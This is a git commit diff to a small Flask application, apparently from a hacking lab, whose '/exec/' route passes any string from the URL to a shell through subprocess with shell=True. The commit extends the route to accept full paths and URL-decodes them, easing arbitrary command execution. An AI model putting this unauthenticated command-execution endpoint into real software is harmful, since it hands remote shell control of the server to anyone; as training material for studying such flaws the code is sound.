c98c85f3b7909d1f2735b044a5f271dc78726892
matthieu-hackwitharts <74831212+matthieu-hackwitharts@users.noreply.github.com>
2024-10-23 13:59:25 +0200

    Update app.py

--- app.py
+++ app.py
@@ -1,14 +1,15 @@
 from flask import Flask
 import subprocess
+from urllib.parse import unquote
 
 app = Flask(__name__)
 
 def run_command(command):
     return subprocess.Popen(command, shell=True, stdout=subprocess.PIPE).stdout.read()
 
-@app.route('/exec/<command>')
-def command_server(command):
-    return run_command(command)
+@app.route('/exec/<path:command>')
+def command_server(command=''):
+    return run_command(unquote(command))
 
 @app.route('/')
 def hello():
